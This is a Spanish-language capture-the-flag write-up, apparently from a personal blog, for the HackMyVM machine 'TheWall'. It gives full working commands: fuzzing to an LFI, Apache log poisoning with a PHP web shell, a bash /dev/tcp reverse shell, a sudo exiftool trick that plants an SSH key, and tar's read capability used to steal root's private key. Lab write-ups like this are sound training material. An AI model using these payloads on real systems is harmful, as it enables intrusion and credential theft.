---
layout: post
title: TheWall
date: 2022-11-27
categories: ["HMV"]
thumbnail: "assets/images/TheWall.png"
---

# TheWall [ Hack My VM ]

### Reconocimiento

**Descubrimiento de puertos y reconocimiento básico**
- `nmap -sS --min-rate 5000 192.168.1.114 -oG allPorts`
- `nmap -sCV -p22,80 192.168.1.114 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Shell

Si miramos la página veremos que sólo pone un `Hello World!` en grande, por lo que poco podemos hacer, pero bueno, podemos seguir investigamos. Si vamos la ruta `/index.php` veremos el mismo mensaje, por lo que ya sabemos que está utilizando `PHP`.

Con esto aprendido podemos hacer `fuzzing` por archivos `PHP`, aunque si nos fijamos veremos que la página tiene un `WAF` (`Web Application Firewall`), por lo que si vamos muy rápido nos dará el mismo mensaje siempre (`Forbidden`). Para el siguiente paso utilizaré `GoBuster`, una herramienta creada en `GoLang` para hacer `fuzzing`.

- `gobuster dir -u "http://192.168.1.114" -w directory-list-2.3-medium.txt -x php - -delay 1s -t 1 --b 403,404`

```
/index.php (Status: 200 ) [Size: 25 ]
/includes.php (Status: 200 ) [Size: 2 ]
```

Tras esperar un buen rato vemos dos archivos, el respectivo `index.php` e `includes.php`, si abrimos dicho archivo veremos una página en blanco, podemos intuir (por el nombre) que dispondrá de algún parámetro que apuntará a un archivo local, por lo que podemos tratar de `fuzzear` ese parámetro. Para ello utilizaré `WFuzz`:

- `wfuzz -u "http://192.168.1.114/includes.php?FUZZ=/etc/passwd" -w directory-list-2.3-medium.txt --hc=404 --hh=2 -t 200`

```
000217299: 200 28 L 41 W 1460 Ch "display_page"
```

Tras otro rato esperando vemos el parámetro `display_page`, así que si nos vamos a la web podemos ver el archivo que queramos de la máquina. Acabamos de encontrar un `LFI`!

Con esto encontrado podemos hacer `Log Poisoning`, para eso me dirigiré a `/var/log/apache2/access.log`, vemos que existe, por lo que podemos  continuar. Con `NC` me conectaré al puerto `80` y mandaré una petición `GET` con un pequeño `script` en `PHP`.

- `nc 192.168.1.114 80`

```
GET <?php system($_GET['cmd']); ?>
```

Este pequeño `script` en `PHP` cogerá el `input` del parámetro `cmd`, lo ejecutará y lo mostrará en pantalla. Por lo que ya podemos ejecutar comandos en la máquina.

Para conseguir una Shell me copié de [`IronHackers`](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/) una Reverse Shell en `Bash` y la puse (intercambiando los `&` por `%26` para no obtener problemas) en el parámetro `cmd`. Antes de todo esto me puse en escucha con `NC` por el puerto `4444`.

- `nc -nlvp 4444`

Ahora sí, estamos preparados para lanzar la Reverse Shell:

```
http://192.168.1.114/includes.php?display_page=bash -c 'bash -i >%26 /dev/tcp/192.168.1.114/4444 0>%261'
```
Bien! Hemos recibido una Shell como `www-data`!

### Subida de privilegios #1

Ahora que ya estamos en la máquina víctima tenemos que tratar de ser `root`, pero antes de eso nos tenemos que convertir en `John`. Comencé por hacer `sudo -l` para listar todo lo que podía hacer en la máquina.

```
Matching Defaults entries for www-data on TheWall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on TheWall:
    (john : john) NOPASSWD: /usr/bin/exiftool
```
Vemos que puedo ejecutar como `John` una herramienta llamada `ExifTool`. Si nos vamos a [`GTFOBins`](https://gtfobins.github.io/gtfobins/exiftool/#sudo) vemos que podemos escribir un archivo con dicha herramienta, por lo que decidí generarme un par de llaves `SSH` en mi máquina de atacante con `ssh-keygen` y copiar la clave pública (`id_rsa.pub`) en el directorio `/tmp/` de la máquina víctima.

Con esto hecho seguí las instrucciones de [`GTFObins`](https://gtfobins.github.io/gtfobins/exiftool/#sudo), quedándome así la instrucción:

- `sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub`

Esto ha hecho que copiemos nuestra `id_rsa` pública en un archivo llamado `authorized_keys`, el
cual al estar ahí nuestra llave podemos conectarnos como `John` sin proporcionar contraseña.

### Subida de privilegios #2

Una vez que estemos como `John` en la máquina ya podemos seguir nuestra misión, conseguir ser `root`, para ello (y tras varios minutos buscando) con el comando `id` listé los grupos a los que pertenecía, pertenecía al grupo `1000` , por lo que me puse a buscar ficheros que pertenezcan a dicho grupo.

- `find / -group 1000 2>/dev/null`

```
[ ... ]
/usr/sbin/tar
[ ... ]
```

Vemos un fichero llamado `tar`, vamos a ver qué capacidades tiene con `/sbin/getcap -r 2>/dev/null`:

```
[ ... ]
/usr/sbin/tar cap_dac_read_search=ep
[ ... ]
```

Como vemos tiene la capacidad de leer archivos. Me encontré un artículo de [`TBHaxor`](https://tbhaxor.com/exploiting-linux-capabilities-part-2/) que explica muy bien cómo poder explotar dicha capacidad, por lo seguí sus pasos, aunque cambiándolo un poco.

Si nos vamos a la raíz del sistema vemos dos archivos, un `id_rsa.pub` el cual
pertenece a `root` y otro archivo, `id_rsa` (el privado) que no podemos leer, por lo que podemos intuir que es de `root`. Vámonos al directorio `/tmp/`.

Bien, es la hora de explotar la capacidad de `TAR`, para ello hacemos lo siguiente:

- `/sbin/tar -czf root.id_rsa /id_rsa`

Como vemos se nos creó un archivo llamado `root.id_rsa` (o como le hayáis puesto) que si lo leemos tendrá la clave privada de `root`.

Enhorabuena! Hemos obtenido `root` en la máquina víctima de forma sencilla!